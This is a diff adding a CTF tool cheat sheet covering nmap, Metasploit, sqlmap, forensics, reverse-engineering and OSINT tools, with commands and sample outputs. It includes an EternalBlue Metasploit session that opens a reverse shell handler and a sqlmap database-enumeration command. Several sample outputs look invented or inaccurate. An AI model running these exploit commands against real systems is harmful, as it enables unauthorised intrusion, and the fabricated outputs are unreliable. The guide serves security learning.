@@ -112,3 +112,386 @@ Challenges related to web applications and their security.
 5. **Analyze HTTP Requests and Responses**: Use tools like `Burp Suite` to capture and modify HTTP traffic. Look for sensitive data or vulnerabilities in the way requests are handled.
 6. **Exploit Vulnerabilities to Access the Flag**: Once a vulnerability is found, exploit it to gain unauthorized access or retrieve sensitive data that contains the flag.
 
+
+`# Important Commands
+
+## Exploit
+
+### 1. Nmap
+- **Description**: Nmap (Network Mapper) is a powerful network scanning tool used to discover hosts and services on a computer network by sending packets and analyzing the responses.
+- **Example/Use Case**: Nmap can be used to identify open ports, running services, and the operating systems of network devices. This information is crucial for vulnerability assessment and penetration testing.
+- **Command**:
+```bash
+nmap -sV -O 192.168.1.1 
+```
+
+-   **Example Output**:
+
+```plaintext
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-31 14:47
+Nmap scan report for 192.168.1.1
+Host is up (0.00050s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6 (protocol 2.0)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+MAC Address: 00:0C:29:5E:8B:4F (VMware, Inc.)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+```
+
+
+### 2. Burp Suite
+
+-   **Description**: Burp Suite is a comprehensive web vulnerability scanner and security testing tool used to find and exploit vulnerabilities in web applications.
+-   **Example/Use Case**: Burp Suite is used to intercept and analyze web traffic, perform security scans, and identify vulnerabilities in web applications.
+-   **Command**: Burp Suite is typically run through its graphical user interface (GUI), so commands are not usually issued via the command line. Instead, you start it with:
+
+```bash   
+`burpsuite` 
+```
+
+-   **Example Output**: The output is graphical and consists of various tabs such as Proxy, Target, Scanner, and Repeater for analyzing web traffic and vulnerabilities.
+
+### 3. Metasploit
+
+-   **Description**: Metasploit is a penetration testing framework that allows security professionals to find and exploit vulnerabilities in systems.
+-   **Example/Use Case**: Metasploit can be used to exploit vulnerabilities in network services or applications. For instance, it can be used to exploit a known vulnerability in a service to gain access to a system.
+-   **Command**:
+```bash
+`msfconsole` 
+```
+
+
+
+
+-   **Example Output**:
+
+```plaintext
+msf > use exploit/windows/smb/ms17_010_eternalblue
+msf exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+msf exploit(ms17_010_eternalblue) > run
+[*] Started reverse TCP handler on 192.168.1.1:4444
+[*] 192.168.1.100:445 - Connecting to target...
+[*] 192.168.1.100:445 - Exploit succeeded
+```
+
+## Forensics
+
+### 1. file
+
+-   **Description**: The `file` command is used to determine the type of a file by analyzing its contents rather than relying solely on the file extension.
+-   **Example/Use Case**: To check the type of a file and identify its format, which can be useful for forensic analysis.
+-   **Command**:
+
+```bash
+`file suspicious_image.png` 
+```
+-   **Example Output**:
+``` plaintext
+'suspicious_image.png: PNG image data, 800 x 600, 8-bit/color RGBA, non-interlaced'
+```
+
+### 2. ExifTool
+
+-   **Description**: ExifTool is a command-line application for reading, writing, and editing meta-information in files, including image metadata.
+-   **Example/Use Case**: Extracting metadata from images to find hidden information or track modifications.
+-   **Command**:
+
+```bash
+`exiftool suspicious_image.png` 
+```
+-   **Example Output**:
+
+```plaintext
+`ExifTool Version Number         : 12.36
+File Name                       : suspicious_image.png
+File Size                       : 123456 bytes
+Image Width                     : 800
+Image Height                    : 600
+Date/Time Original              : 2024:08:31 12:34:56` 
+```
+
+### 3. binwalk
+
+-   **Description**: Binwalk is a tool for analyzing and extracting data from binary files. It is often used for firmware analysis.
+-   **Example/Use Case**: To search for and extract embedded files or data from binary files.
+-   **Command**:
+
+```bash
+`binwalk -e firmware.bin` 
+```
+-   **Example Output**:
+
+```plaintext
+`DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Embedded file: initramfs
+123456        0x1E240         Embedded file: rootfs.img` 
+```
+
+### 4. foremost
+
+-   **Description**: Foremost is a console program to recover files based on their headers, footers, and internal data structures.
+-   **Example/Use Case**: To recover files from disk images or other data sources where file headers might be damaged or missing.
+-   **Command**:
+
+```bash
+
+`foremost -i disk_image.img -o recovered_files` 
+```
+-   **Example Output**:
+
+```plaintext
+`Foremost v1.5.7 by Sumuri
+Recovering files from disk_image.img
+Processing: image/jpeg - found 15 files
+Processing: image/png - found 10 files` 
+```
+
+### 5. Stegsolve
+
+-   **Description**: Stegsolve is a graphical tool for analyzing and extracting hidden data from images.
+-   **Example/Use Case**: To analyze an image for hidden messages or data through various steganographic techniques.
+-   **Command**: Stegsolve is run as a Java application:
+
+```bash
+`java -jar stegsolve.jar` 
+```
+-   **Example Output**: The output is graphical, showing various analysis filters and options to reveal hidden information in images.
+
+### 6. zsteg
+
+-   **Description**: zsteg is a tool for detecting and extracting data from PNG and BMP images that use steganographic techniques.
+-   **Example/Use Case**: To analyze images for hidden data using different color channels and bit layers.
+-   **Command**:
+
+```bash
+`zsteg -a suspicious_image.png` 
+```
+-   **Example Output**:
+
+```plaintext
+`Detected LSB (Least Significant Bit) data in PNG image
+Secret message: flag{hidden_in_image}` 
+```
+
+### 7. strings
+
+-   **Description**: The `strings` command extracts and displays printable strings from binary files or data.
+-   **Example/Use Case**: To find hidden text or other useful information within binary files or memory dumps.
+-   **Command**:
+
+```bash
+`strings binary_file.bin` 
+```
+-   **Example Output**:
+
+```plaintext
+`This is a secret message.
+Another useful string` 
+```
+
+### 8. Volatility
+
+-   **Description**: Volatility is a framework for analyzing and extracting information from memory dumps, used in digital forensics.
+-   **Example/Use Case**: To analyze a memory dump to extract information such as running processes, network connections, and malware.
+-   **Command**:
+
+```bash
+`volatility -f memory_dump.raw --profile=Win7SP1x64 pslist` 
+```
+-   **Example Output**:
+
+```plaintext
+`Volatility Foundation Volatility Framework 2.6
+Offset(V)          Name                    PID   PPID  Thds  Hnds  Sess  Wow64
+------------------ ------------------------ ----- ----- ----- ----- ----- -----
+0x81000            System                      4     0     70   340     0     0
+0x9c00             smss.exe                  320     4      2     12     0     0` 
+```
+
+## Investigation
+
+### 1. Maltego
+
+-   **Description**: Maltego is an OSINT (Open Source Intelligence) and forensics application used to gather and analyze information about people, groups, websites, and other entities.
+-   **Example/Use Case**: To map out relationships and gather data on a specific target by analyzing links between various entities.
+-   **Command**: Maltego is run through its GUI, so commands are typically issued via its interface. Start it with:
+
+```bash
+`maltego` 
+```
+-   **Example Output**: The output is graphical, showing relationships and connections between different entities.
+
+### 2. Recon-ng
+
+-   **Description**: Recon-ng is a web reconnaissance framework with a powerful interface and modular design for gathering intelligence from various sources.
+-   **Example/Use Case**: To perform reconnaissance on a target, such as gathering domain information, email addresses, and more.
+-   **Command**:
+
+```bash
+`recon-ng` 
+```
+-   **Example Output**:
+
+```plaintext
+`[recon-ng][default] > use recon/hosts-domains/get_host
+[recon-ng][default] > set SOURCE example.com
+[recon-ng][default] > run
++-------------------------+---------------------------+
+| Domain Name             | IP Address                |
++-------------------------+---------------------------+
+| example.com             | 93.184.216.34             |
++-------------------------+---------------------------+` 
+```
+
+### 3. theHarvester
+
+-   **Description**: theHarvester is a tool used to gather email addresses, subdomains, hosts, and other information from public sources for use in penetration testing and reconnaissance.
+-   **Example/Use Case**: To collect information about email addresses and subdomains related to a specific domain.
+-   **Command**:
+
+```bash
+`theHarvester -d example.com -b google` 
+```
+-   **Example Output**:
+
+```plaintext
+`Google search found 15 email addresses:
+- contact@example.com
+- support@example.com` 
+```
+
+## Reverse Engineering
+
+### 1. file
+
+-   **Description**: The `file` command determines the type of a file by analyzing its contents rather than relying on file extensions.
+-   **Example/Use Case**: To identify the format of a binary file for reverse engineering.
+-   **Command**:
+
+```bash
+`file binary_file.bin` 
+```
+-   **Example Output**:
+
+```plaintext
+`binary_file.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=...` 
+```
+
+### 2. Ghidra
+
+-   **Description**: Ghidra is a software reverse engineering (SRE) framework developed by the NSA that helps in analyzing binaries and decompiling code.
+-   **Example/Use Case**: To disassemble and analyze executable files for vulnerabilities or understand their functionality.
+-   **Command**: Ghidra is used through its GUI. Start it with:
+
+```bash
+`ghidraRun` 
+```
+-   **Example Output**: The output is graphical, showing the disassembled code and analysis tools.
+
+### 3. IDA Pro
+
+-   **Description**: IDA Pro (Interactive DisAssembler) is a disassembler and debugger used for reverse engineering binary files.
+-   **Example/Use Case**: To decompile and analyze binaries to understand their functionality and discover vulnerabilities.
+-   **Command**: IDA Pro is used through its GUI. Start it with:
+
+```bash
+`idaq` 
+```
+-   **Example Output**: The output is graphical, showing the disassembled code and analysis tools.
+
+### 4. Radare2
+
+-   **Description**: Radare2 is an open-source framework for reverse engineering and analyzing binaries.
+-   **Example/Use Case**: To analyze binary files, debug, and disassemble code. It is useful for finding vulnerabilities and understanding binary behavior.
+-   **Command**:
+
+```bash
+`radare2 binary_file.bin` 
+```
+-   **Example Output**:
+
+```plaintext
+`-- Welcome to radare2! --
+[0x004005f0]> aaa
+[0x004005f0]> pdf @ main` 
+```
+
+### 5. GDB
+
+-   **Description**: GDB (GNU Debugger) is a debugger for programs written in C, C++, and other languages. It allows you to inspect and control the execution of programs.
+-   **Example/Use Case**: To debug and analyze the execution of a binary file, step through code, and inspect variables.
+-   **Command**:
+
+```bash
+`gdb binary_file` 
+```
+-   **Example Output**:
+
+```plaintext
+`(gdb) break main
+Breakpoint 1 at 0x4011b6: file main.c, line 5.
+(gdb) run
+Starting program: /path/to/binary_file
+Break in main at 0x4011b6: file main.c, line 5.` 
+```
+
+## Web
+
+### 1. Burp Suite
+
+-   **Description**: Burp Suite is a comprehensive web vulnerability scanner and security testing tool used to find and exploit vulnerabilities in web applications.
+-   **Example/Use Case**: To intercept and analyze HTTP requests and responses, perform security scans, and identify vulnerabilities.
+-   **Command**: Burp Suite is typically run through its GUI. Start it with:
+
+```bash
+`burpsuite` 
+```
+-   **Example Output**: The output is graphical, showing tabs for Proxy, Target, Scanner, Repeater, etc., for analyzing and manipulating web traffic.
+
+### 2. OWASP ZAP
+
+-   **Description**: OWASP ZAP (Zed Attack Proxy) is an open-source web application security scanner used to find vulnerabilities in web applications.
+-   **Example/Use Case**: To scan web applications for security issues and vulnerabilities. It provides automated and manual testing capabilities.
+-   **Command**: Start OWASP ZAP with:
+
+```bash
+`zap.sh` 
+```
+-   **Example Output**: The output is graphical, showing the various security findings and vulnerabilities discovered during the scan.
+
+### 3. sqlmap
+
+-   **Description**: sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities.
+-   **Example/Use Case**: To test a web application for SQL injection vulnerabilities and exploit them to gain access to the database.
+-   **Command**:
+
+```bash
+`sqlmap -u "http://example.com/page.php?id=1" --dbs` 
+```
+-   **Example Output**:
+
+```plaintext
+`[*] Testing connection to the target URL
+[*] Database: example_db
+[*] Available databases:
+[*]  - information_schema
+[*]  - mysql
+[*]  - example_db` 
+```
+
+### 4. Burp Suite
+
+-   **Description**: Burp Suite (repeated for emphasis) is a comprehensive tool for web application security testing.
+-   **Example/Use Case**: Used for intercepting and manipulating HTTP requests, scanning for vulnerabilities, and testing web application security.
+-   **Command**: Again, start Burp Suite through its GUI with:
+
+```bash
+`burpsuite` 
+```
+-   **Example Output**: The output is graphical and includes features for intercepting HTTP requests, scanning for vulnerabilities, and more.
